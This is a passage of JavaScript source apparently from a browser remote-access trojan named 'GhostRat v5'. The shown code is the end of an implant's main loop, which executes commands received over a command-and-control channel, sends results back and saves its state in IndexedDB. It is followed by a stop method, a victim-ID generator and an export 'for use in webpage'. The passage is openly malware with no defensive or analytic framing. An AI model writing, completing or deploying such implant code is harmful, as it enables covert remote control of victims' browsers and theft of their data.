                    const result = this.executeCommand(command);

                    // Send result via C2 channel
                    await this.sendResult(result);
                }

                // Save state every 5 polls (IndexedDB persistence)
                this.pollCount++;
                if (this.pollCount % 5 === 0) {
                    await this.storeC2State();
                }

                // Wait for poll interval
                await new Promise(resolve => setTimeout(resolve, this.pollInterval));
            } catch (error) {
                console.error('[GhostRat v5] Main loop error:', error);
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    }

    // Stop implant
    stop() {
        this.isRunning = false;
        console.log('[GhostRat v5] Implant stopped');
    }

    // ============================================================
    // HELPERS
    // ============================================================

    generateVictimId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let id = '';
        for (let i = 0; i < 16; i++) {
            id += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return id;
    }
}

// ============================================================
// Export for use in webpage
// ============================================================

if (typeof module !== 'undefined' && module.exports) {
    module.exports = GhostRatV5;
}
